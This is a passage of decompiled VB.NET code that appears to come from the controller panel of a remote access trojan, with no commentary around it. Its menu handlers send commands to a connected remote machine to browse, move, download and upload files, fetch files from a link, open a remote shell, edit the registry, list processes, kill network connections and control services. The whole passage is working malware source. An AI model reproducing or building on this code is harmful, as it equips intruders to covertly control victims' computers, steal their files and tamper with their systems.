			If Operators.CompareString(text, String.Empty, False) <> 0 Then
				Me.Flist = text.Remove(0, 1)
				Me.isCut = True
			End If
		End Sub

		' Token: 0x060003A5 RID: 933 RVA: 0x00021FE4 File Offset: 0x000201E4
		Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.Flist, String.Empty, False) <> 0 Then
				If Me.isCut Then
					Dim client As Client = Me.sk
					Dim array As String() = New String(8) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "mv"
					array(5) = Class7.string_1
					Dim array2 As String() = array
					Dim num As Integer = 6
					Dim text As String = (Me.TextBox1.Text + "\").Replace("\\", "\")
					array2(num) = Class6.smethod_14(text)
					array(7) = Class7.string_1
					array(8) = Class6.smethod_14(Me.Flist)
					client.Send(String.Concat(array))
				Else
					Dim client2 As Client = Me.sk
					Dim array As String() = New String(8) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "cp"
					array(5) = Class7.string_1
					Dim array3 As String() = array
					Dim num2 As Integer = 6
					Dim text As String = (Me.TextBox1.Text + "\").Replace("\\", "\")
					array3(num2) = Class6.smethod_14(text)
					array(7) = Class7.string_1
					array(8) = Class6.smethod_14(Me.Flist)
					client2.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x060003A6 RID: 934 RVA: 0x0002213C File Offset: 0x0002033C
		Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					If Operators.CompareString(listViewItem.Text, "..", False) <> 0 Then
						If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0 Then
							Dim array As String() = New String(8) {}
							array(0) = "Ex"
							array(1) = Class7.string_1
							array(2) = "fm"
							array(3) = Class7.string_1
							array(4) = "dw"
							array(5) = Class7.string_1
							Dim listViewItem2 As ListViewItem = listViewItem
							Dim toolTipText As String = listViewItem2.ToolTipText
							listViewItem2.ToolTipText = toolTipText
							array(6) = Class6.smethod_14(toolTipText)
							array(7) = Class7.string_1
							array(8) = Me.sk.ip()
							Me.sk.Send(String.Concat(array))
						End If
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060003A7 RID: 935 RVA: 0x00022254 File Offset: 0x00020454
		Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.L2.Items.Count <> 0 Then
					Dim text As String = Me.TextBox1.Text
					Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.FileName = String.Empty
					openFileDialog.Multiselect = True
					If openFileDialog.ShowDialog() = DialogResult.OK Then
						Dim fileNames As String() = openFileDialog.FileNames
						Dim num As Integer = 0
						Dim num2 As Integer = fileNames.Length - 1
						Dim num3 As Integer = num
						While True
							Dim num4 As Integer = num3
							Dim num5 As Integer = num2
							If num4 > num5 Then
								Exit For
							End If
							Dim text2 As String = fileNames(num3)
							If FileSystem.FileLen(text2) <> 0L Then
								Dim up As up = New up()
								up.TMP = text2
								up.FN = (text + "\" + New FileInfo(text2).Name).Replace("\\", "\")
								up.Name = Me.sk.ip() + Class6.smethod_14(up.FN)
								up.osk = Me.sk
								up.SZ = CInt(FileSystem.FileLen(up.TMP))
								up.Text = New FileInfo(up.TMP).Name + " >> " + up.FN
								up.Show()
							End If
							num3 += 1
						End While
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003A8 RID: 936 RVA: 0x000223D0 File Offset: 0x000205D0
		Private Sub NewEmptyFileToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("File Name?", "New File", "New Text.txt", -1, -1)
			If text.Length <> 0 Then
				Dim client As Client = Me.sk
				Dim array As String() = New String(6) {}
				array(0) = "Ex"
				array(1) = Class7.string_1
				array(2) = "fm"
				array(3) = Class7.string_1
				array(4) = "nf"
				array(5) = Class7.string_1
				Dim array2 As String() = array
				Dim num As Integer = 6
				Dim text2 As String = Me.TextBox1.Text + text
				array2(num) = Class6.smethod_14(text2)
				client.Send(String.Concat(array))
			End If
		End Sub

		' Token: 0x060003A9 RID: 937 RVA: 0x00022468 File Offset: 0x00020668
		Private Sub NewFolderToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("Folder Name?", "New Folder", "New Folder", -1, -1)
			If text.Length <> 0 Then
				Dim client As Client = Me.sk
				Dim array As String() = New String(6) {}
				array(0) = "Ex"
				array(1) = Class7.string_1
				array(2) = "fm"
				array(3) = Class7.string_1
				array(4) = "nd"
				array(5) = Class7.string_1
				Dim array2 As String() = array
				Dim num As Integer = 6
				Dim text2 As String = Me.TextBox1.Text + text
				array2(num) = Class6.smethod_14(text2)
				client.Send(String.Concat(array))
			End If
		End Sub

		' Token: 0x060003AA RID: 938 RVA: 0x00022500 File Offset: 0x00020700
		Private Sub OpenDownloadsToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Not Directory.Exists(Me.string_0) Then
				Directory.CreateDirectory(Me.string_0)
			End If
			Try
				Process.Start(Me.string_0)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003AB RID: 939 RVA: 0x00022558 File Offset: 0x00020758
		Private Sub RarToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L2.SelectedItems.Count <> 0 Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rar", Class7.string_1 })
				Dim text2 As String = Interaction.InputBox("Enter Rar Name", String.Empty, New DirectoryInfo(Me.TextBox1.Text).Name + ".rar", -1, -1)
				If Operators.CompareString(text2, String.Empty, False) <> 0 Then
					Dim textBox As TextBox = Me.TextBox1
					Dim text3 As String = textBox.Text
					textBox.Text = text3
					text = String.Concat(New String() { text, Class6.smethod_14(text2), Class7.string_1, Class6.smethod_14(text3), Class7.string_1 })
					Dim str As String = "a -y """ + text2 + """"
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							str = str + " """ + listViewItem.Text + """"
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
					text += Class6.smethod_14(str)
					Me.sk.Send(text)
				End If
			End If
		End Sub

		' Token: 0x060003AC RID: 940 RVA: 0x000226FC File Offset: 0x000208FC
		Private Sub UnRarToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L2.SelectedItems.Count <> 0 Then
				Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
				Dim toolTipText As String = listViewItem.ToolTipText
				listViewItem.ToolTipText = toolTipText
				Dim s As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "unrar", Class7.string_1 }) + Class6.smethod_14(toolTipText)
				Me.sk.Send(s)
			End If
		End Sub

		' Token: 0x060003AD RID: 941 RVA: 0x00022798 File Offset: 0x00020998
		Private Sub UploadFromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.TextBox1.Text, String.Empty, False) <> 0 Then
				Dim fromLink As FromLink = New FromLink()
				fromLink.ShowDialog(Me)
				If fromLink.IsOK Then
					Dim array As String() = New String(8) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "fl"
					array(5) = Class7.string_1
					Dim textBox As TextBox = fromLink.TextBox1
					Dim text As String = textBox.Text
					textBox.Text = text
					array(6) = Class6.smethod_14(text)
					array(7) = Class7.string_1
					Dim array2 As String() = array
					Dim num As Integer = 8
					Dim text2 As String = Me.TextBox1.Text + fromLink.TextBox2.Text
					array2(num) = Class6.smethod_14(text2)
					Me.sk.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x060003AE RID: 942 RVA: 0x00022878 File Offset: 0x00020A78
		Private Sub RGk_NodeMouseClick(sender As Object, e As TreeNodeMouseClickEventArgs)
			If e.Button = MouseButtons.Left Then
				If e.Node.IsExpanded Then
					e.Node.Collapse()
				Else
					e.Node.Expand()
				End If
			End If
		End Sub

		' Token: 0x060003AF RID: 943 RVA: 0x000228BC File Offset: 0x00020ABC
		Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs)
			Try
				If Me.ListView1.SelectedItems.Count <> 0 Then
					Me.cur = CType(Me.ListView1.SelectedIndices(0), Manager.CR)
					Select Case Me.cur
						Case Manager.CR.fm
							Me.FMM.BringToFront()
							Me.LPR.SendToBack()
							Me.LTCP.SendToBack()
							Me.RG.SendToBack()
							Me.RG.SendToBack()
							Me.sh.SendToBack()
							Me.LSRV.SendToBack()
							Me.L2.method_3()
						Case Manager.CR.PR
							Me.LPR.BringToFront()
							Me.LPR.method_3()
						Case Manager.CR.tcp
							Me.LTCP.BringToFront()
							Me.LTCP.method_3()
						Case Manager.CR.reg
							Me.RG.BringToFront()
						Case Manager.CR.shl
							Me.sh.BringToFront()
							If Me.shStarted = 0 Then
								Me.shStarted = 1
								Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "~" }))
							End If
						Case Manager.CR.srv
							Me.LSRV.BringToFront()
							Me.LSRV.method_3()
					End Select
					Me.Icon = Icon.FromHandle(CType(Me.vmethod_148.Images(Me.ListView1.SelectedItems(0).ImageIndex), Bitmap).GetHicon())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003B0 RID: 944 RVA: 0x00022AA8 File Offset: 0x00020CA8
		Private Sub KillConnectionToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "tcp", Class7.string_1, "!" })
			If Me.LTCP.SelectedItems.Count <> 0 Then
				Try
					For Each obj As Object In Me.LTCP.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Tag.ToString()
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x060003B1 RID: 945 RVA: 0x00022B78 File Offset: 0x00020D78
		Private Sub RefreshToolStripMenuItem3_Click(sender As Object, e As EventArgs)
			Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "~" }))
		End Sub

		' Token: 0x060003B2 RID: 946 RVA: 0x00022BC8 File Offset: 0x00020DC8
		Private Sub CreateKeyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.RGk.SelectedNode IsNot Nothing AndAlso Me.RGk.SelectedNode.FullPath.Contains("\") Then
				Dim text As String = Interaction.InputBox("Key Name?", "Create New Key", "Name", -1, -1)
				If text.Length <> 0 Then
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "#", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\", Class7.string_1, text }))
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
				End If
			End If
		End Sub

		' Token: 0x060003B3 RID: 947 RVA: 0x00022D1C File Offset: 0x00020F1C
		Private Sub DeleteSelectedToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.RGk.SelectedNode IsNot Nothing Then
				Dim fullPath As String = Me.RGk.SelectedNode.FullPath
				If fullPath.Contains("\") Then
					Dim text As String = Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 1)
					Dim text2 As String = String.Empty
					Dim num As Integer = Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 2
					For i As Integer = 0 To num
						text2 = text2 + Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(i) + "\"
					Next
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "$", Class7.string_1, text2, Class7.string_1, text }))
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, text, "\" }))
				End If
			End If
		End Sub

		' Token: 0x060003B4 RID: 948 RVA: 0x00022EA4 File Offset: 0x000210A4
		Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.LSRV.SelectedItems.Count <> 0 Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "!", text }))
			End If
		End Sub

		' Token: 0x060003B5 RID: 949 RVA: 0x00022F7C File Offset: 0x0002117C
		Private Sub PauseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.LSRV.SelectedItems.Count <> 0 Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "@", text }))
			End If
		End Sub

		' Token: 0x060003B6 RID: 950 RVA: 0x00023054 File Offset: 0x00021254
		Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.LSRV.SelectedItems.Count <> 0 Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "#", text }))
			End If
		End Sub

		' Token: 0x060003B7 RID: 951 RVA: 0x0002312C File Offset: 0x0002132C
		Private Sub EditToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			If Me.L2.SelectedItems.Count > 0 Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rd" })
				Try
					For Each obj As Object In Me.L2.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0 Then
							Dim listViewItem2 As ListViewItem = listViewItem
							Dim toolTipText As String = listViewItem2.ToolTipText
							listViewItem2.ToolTipText = toolTipText
							text = text + Class7.string_1 + Class6.smethod_14(toolTipText)
						End If
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x060003B8 RID: 952 RVA: 0x0002164C File Offset: 0x0001F84C
		Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			If Me.RGk.SelectedNode IsNot Nothing Then
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
			End If
		End Sub

		' Token: 0x060003B9 RID: 953 RVA: 0x00023234 File Offset: 0x00021434
		Private Sub vmethod_26_Tick(sender As Object, e As EventArgs)
			Me.vmethod_26.Enabled = False
			If Me.sk Is Nothing Then
				Me.Close()
			ElseIf Not Me.sk.CN Then
				Me.Close()
			Else
				Try
					Select Case Me.cur
						Case Manager.CR.PR
							Me.vmethod_26.Interval = 2000
							If Me.PRNXT Then
								Dim enumerator As IEnumerator = Me.LPR.Items.GetEnumerator()
								Dim text As String = String.Empty
								While enumerator.MoveNext()
									Dim obj As Object = enumerator.Current
									Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
									If listViewItem IsNot Nothing Then
										text = text + Class7.string_1 + listViewItem.SubItems(1).Text
									End If
								End While
								Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "U", text }))
								Me.PRNXT = False
							End If
						Case Manager.CR.tcp
							Me.vmethod_26.Interval = 2000
							If Me.TCPNXT Then
								Dim text2 As String = String.Concat(New String() { "Ex", Class7.string_1, "tcp", Class7.string_1, "~", Class7.string_1 })
								Try
									For Each obj2 As Object In Me.LTCP.Items
										Dim listViewItem2 As ListViewItem = CType(obj2, ListViewItem)
										text2 = text2 + listViewItem2.Tag.ToString() + Class7.string_1
									Next
								Finally
									Dim enumerator2 As IEnumerator
									If TypeOf enumerator2 Is IDisposable Then
										TryCast(enumerator2, IDisposable).Dispose()
									End If
								End Try
								Me.sk.Send(text2)
								Me.TCPNXT = False
							End If
						Case Manager.CR.srv
							Me.vmethod_26.Interval = 4000
							If Me.srvNxt Then
								Dim s As String = String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "~" })
								Me.sk.Send(s)
								Me.srvNxt = False
							End If
					End Select
				Catch ex As Exception
				End Try
				Me.vmethod_26.Enabled = True
			End If
		End Sub

		' Token: 0x060003BA RID: 954 RVA: 0x0002351C File Offset: 0x0002171C
		Private Sub L1_DoubleClick1(sender As Object, e As EventArgs)
			If Me.L1.SelectedItems.Count <> 0 Then
				Me.exp(Me.L1.SelectedItems(0).ToolTipText, False)
			End If
		End Sub

		' Token: 0x060003BB RID: 955 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x0400013A RID: 314
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400013C RID: 316
		<AccessedThroughProperty("StatusStrip1")>
		Private _StatusStrip1 As StatusStrip

		' Token: 0x0400013D RID: 317
		<AccessedThroughProperty("SL")>
		Private _SL As ToolStripStatusLabel

		' Token: 0x0400013E RID: 318
		<AccessedThroughProperty("pr")>
		Private _pr As ToolStripProgressBar

		' Token: 0x0400013F RID: 319
		<AccessedThroughProperty("M1")>
		Private _M1 As ContextMenuStrip

		' Token: 0x04000140 RID: 320
		<AccessedThroughProperty("KillToolStripMenuItem1")>
		Private _KillToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x04000141 RID: 321
		<AccessedThroughProperty("KillDeleteToolStripMenuItem")>
		Private _KillDeleteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000142 RID: 322
		<AccessedThroughProperty("RestartProcessToolStripMenuItem")>
		Private _RestartProcessToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000143 RID: 323
		<AccessedThroughProperty("vmethod_26")>
		Private _vmethod_26 As Timer

		' Token: 0x04000144 RID: 324
		<AccessedThroughProperty("ImageList1")>
		Private _ImageList1 As ImageList

		' Token: 0x04000145 RID: 325
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x04000146 RID: 326
		<AccessedThroughProperty("KillConnectionToolStripMenuItem")>
		Private _KillConnectionToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000147 RID: 327
		<AccessedThroughProperty("crg")>
		Private _crg As ContextMenuStrip

		' Token: 0x04000148 RID: 328
		<AccessedThroughProperty("RefreshToolStripMenuItem")>
		Private _RefreshToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000149 RID: 329
		<AccessedThroughProperty("EditToolStripMenuItem")>
		Private _EditToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400014A RID: 330
		<AccessedThroughProperty("NewValueToolStripMenuItem")>
		Private _NewValueToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400014B RID: 331
		<AccessedThroughProperty("DeleteToolStripMenuItem")>
		Private _DeleteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400014C RID: 332
		<AccessedThroughProperty("rimg")>
		Private _rimg As ImageList

		' Token: 0x0400014D RID: 333
		<AccessedThroughProperty("crgk")>
		Private _crgk As ContextMenuStrip

		' Token: 0x0400014E RID: 334
		<AccessedThroughProperty("RefreshToolStripMenuItem1")>
		Private _RefreshToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x0400014F RID: 335
		<AccessedThroughProperty("CreateKeyToolStripMenuItem")>
		Private _CreateKeyToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000150 RID: 336
		<AccessedThroughProperty("DeleteSelectedToolStripMenuItem")>
		Private _DeleteSelectedToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000151 RID: 337
		<AccessedThroughProperty("ContextMenuStrip2")>
		Private _ContextMenuStrip2 As ContextMenuStrip

		' Token: 0x04000152 RID: 338
		<AccessedThroughProperty("StopToolStripMenuItem")>
		Private _StopToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000153 RID: 339
		<AccessedThroughProperty("PauseToolStripMenuItem")>
		Private _PauseToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000154 RID: 340
		<AccessedThroughProperty("StartToolStripMenuItem")>
		Private _StartToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000155 RID: 341
		<AccessedThroughProperty("ContextMenuStrip3")>
		Private _ContextMenuStrip3 As ContextMenuStrip

		' Token: 0x04000156 RID: 342
		<AccessedThroughProperty("UPToolStripMenuItem")>
		Private _UPToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000157 RID: 343
		<AccessedThroughProperty("RefreshToolStripMenuItem2")>
		Private _RefreshToolStripMenuItem2 As ToolStripMenuItem

		' Token: 0x04000158 RID: 344
		<AccessedThroughProperty("RunToolStripMenuItem")>
		Private _RunToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000159 RID: 345
		<AccessedThroughProperty("DeleteToolStripMenuItem1")>
		Private _DeleteToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x0400015A RID: 346
		<AccessedThroughProperty("EditToolStripMenuItem1")>
		Private _EditToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x0400015B RID: 347
		<AccessedThroughProperty("RenameToolStripMenuItem")>
		Private _RenameToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400015C RID: 348
		<AccessedThroughProperty("CopyToolStripMenuItem")>
		Private _CopyToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400015D RID: 349
		<AccessedThroughProperty("CutToolStripMenuItem")>
		Private _CutToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400015E RID: 350
		<AccessedThroughProperty("PasteToolStripMenuItem")>
		Private _PasteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400015F RID: 351
		<AccessedThroughProperty("DownloadToolStripMenuItem")>
		Private _DownloadToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000160 RID: 352
		<AccessedThroughProperty("UploadToolStripMenuItem")>
		Private _UploadToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000161 RID: 353
		<AccessedThroughProperty("NewEmptyFileToolStripMenuItem")>
		Private _NewEmptyFileToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000162 RID: 354
		<AccessedThroughProperty("NewFolderToolStripMenuItem")>
		Private _NewFolderToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000163 RID: 355
		<AccessedThroughProperty("OpenDownloadsToolStripMenuItem")>
		Private _OpenDownloadsToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000164 RID: 356
		<AccessedThroughProperty("RarToolStripMenuItem")>
		Private _RarToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000165 RID: 357
		<AccessedThroughProperty("UnRarToolStripMenuItem")>
		Private _UnRarToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000166 RID: 358
		<AccessedThroughProperty("UploadFromLinkToolStripMenuItem")>
		Private _UploadFromLinkToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000167 RID: 359
		<AccessedThroughProperty("ContextMenuStrip4")>
		Private _ContextMenuStrip4 As ContextMenuStrip

		' Token: 0x04000168 RID: 360
		<AccessedThroughProperty("RefreshToolStripMenuItem3")>
		Private _RefreshToolStripMenuItem3 As ToolStripMenuItem

		' Token: 0x04000169 RID: 361
		<AccessedThroughProperty("MG")>
		Private _MG As ImageList

		' Token: 0x0400016A RID: 362
		<AccessedThroughProperty("ListView1")>
		Private _ListView1 As ListView

		' Token: 0x0400016B RID: 363
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x0400016C RID: 364
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x0400016D RID: 365
		<AccessedThroughProperty("vmethod_148")>
		Private _vmethod_148 As ImageList

		' Token: 0x0400016E RID: 366
		<AccessedThroughProperty("Timer1")>
		Private _Timer1 As Timer

		' Token: 0x0400016F RID: 367
		<AccessedThroughProperty("FMM")>
		Private _FMM As Panel

		' Token: 0x04000170 RID: 368
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x04000171 RID: 369
		<AccessedThroughProperty("L1")>
		Private _L1 As GClass9

		' Token: 0x04000172 RID: 370
		<AccessedThroughProperty("ColumnHeader6")>
		Private _ColumnHeader6 As ColumnHeader

		' Token: 0x04000173 RID: 371
		<AccessedThroughProperty("ColumnHeader7")>
		Private _ColumnHeader7 As ColumnHeader

		' Token: 0x04000174 RID: 372
		<AccessedThroughProperty("p")>
		Private _p As PictureBox

		' Token: 0x04000175 RID: 373
		<AccessedThroughProperty("L2")>
		Private _L2 As GClass9

		' Token: 0x04000176 RID: 374
		<AccessedThroughProperty("ColumnHeader8")>
		Private _ColumnHeader8 As ColumnHeader

		' Token: 0x04000177 RID: 375
		<AccessedThroughProperty("ColumnHeader9")>
		Private _ColumnHeader9 As ColumnHeader

		' Token: 0x04000178 RID: 376
		<AccessedThroughProperty("ColumnHeader10")>
		Private _ColumnHeader10 As ColumnHeader

		' Token: 0x04000179 RID: 377
		<AccessedThroughProperty("LTCP")>
		Private _LTCP As GClass9

		' Token: 0x0400017A RID: 378
		<AccessedThroughProperty("ColumnHeader16")>
		Private _ColumnHeader16 As ColumnHeader

		' Token: 0x0400017B RID: 379
		<AccessedThroughProperty("ColumnHeader17")>
		Private _ColumnHeader17 As ColumnHeader

		' Token: 0x0400017C RID: 380
		<AccessedThroughProperty("ColumnHeader18")>
		Private _ColumnHeader18 As ColumnHeader

		' Token: 0x0400017D RID: 381
		<AccessedThroughProperty("ColumnHeader19")>
		Private _ColumnHeader19 As ColumnHeader

		' Token: 0x0400017E RID: 382
		<AccessedThroughProperty("ColumnHeader20")>
		Private _ColumnHeader20 As ColumnHeader

		' Token: 0x0400017F RID: 383
		<AccessedThroughProperty("ColumnHeader21")>
		Private _ColumnHeader21 As ColumnHeader

		' Token: 0x04000180 RID: 384
		<AccessedThroughProperty("RG")>
		Private _RG As Panel

		' Token: 0x04000181 RID: 385
		<AccessedThroughProperty("RGLIST")>
		Private _RGLIST As GClass9

		' Token: 0x04000182 RID: 386
		<AccessedThroughProperty("ColumnHeader3")>
		Private _ColumnHeader3 As ColumnHeader

		' Token: 0x04000183 RID: 387
		<AccessedThroughProperty("ColumnHeader4")>
		Private _ColumnHeader4 As ColumnHeader

		' Token: 0x04000184 RID: 388
		<AccessedThroughProperty("ColumnHeader5")>
		Private _ColumnHeader5 As ColumnHeader

		' Token: 0x04000185 RID: 389
		<AccessedThroughProperty("RGk")>
		Private _RGk As TreeView

		' Token: 0x04000186 RID: 390
		<AccessedThroughProperty("sh")>
		Private _sh As Panel

		' Token: 0x04000187 RID: 391
		<AccessedThroughProperty("T1")>
		Private _T1 As RichTextBox

		' Token: 0x04000188 RID: 392
		<AccessedThroughProperty("T2")>
		Private _T2 As TextBox

		' Token: 0x04000189 RID: 393
		<AccessedThroughProperty("LPR")>
		Private _LPR As GClass9

		' Token: 0x0400018A RID: 394
		<AccessedThroughProperty("ColumnHeader22")>
		Private _ColumnHeader22 As ColumnHeader

		' Token: 0x0400018B RID: 395
		<AccessedThroughProperty("ColumnHeader23")>
		Private _ColumnHeader23 As ColumnHeader

		' Token: 0x0400018C RID: 396
		<AccessedThroughProperty("ColumnHeader24")>
		Private _ColumnHeader24 As ColumnHeader

		' Token: 0x0400018D RID: 397
		<AccessedThroughProperty("ColumnHeader25")>
		Private _ColumnHeader25 As ColumnHeader

		' Token: 0x0400018E RID: 398
		<AccessedThroughProperty("ColumnHeader26")>
		Private _ColumnHeader26 As ColumnHeader

		' Token: 0x0400018F RID: 399
		<AccessedThroughProperty("LSRV")>
		Private _LSRV As GClass9

		' Token: 0x04000190 RID: 400
		<AccessedThroughProperty("ColumnHeader11")>
		Private _ColumnHeader11 As ColumnHeader

		' Token: 0x04000191 RID: 401
		<AccessedThroughProperty("ColumnHeader12")>
		Private _ColumnHeader12 As ColumnHeader

		' Token: 0x04000192 RID: 402
		<AccessedThroughProperty("ColumnHeader13")>
		Private _ColumnHeader13 As ColumnHeader

		' Token: 0x04000193 RID: 403
		<AccessedThroughProperty("ColumnHeader14")>
		Private _ColumnHeader14 As ColumnHeader

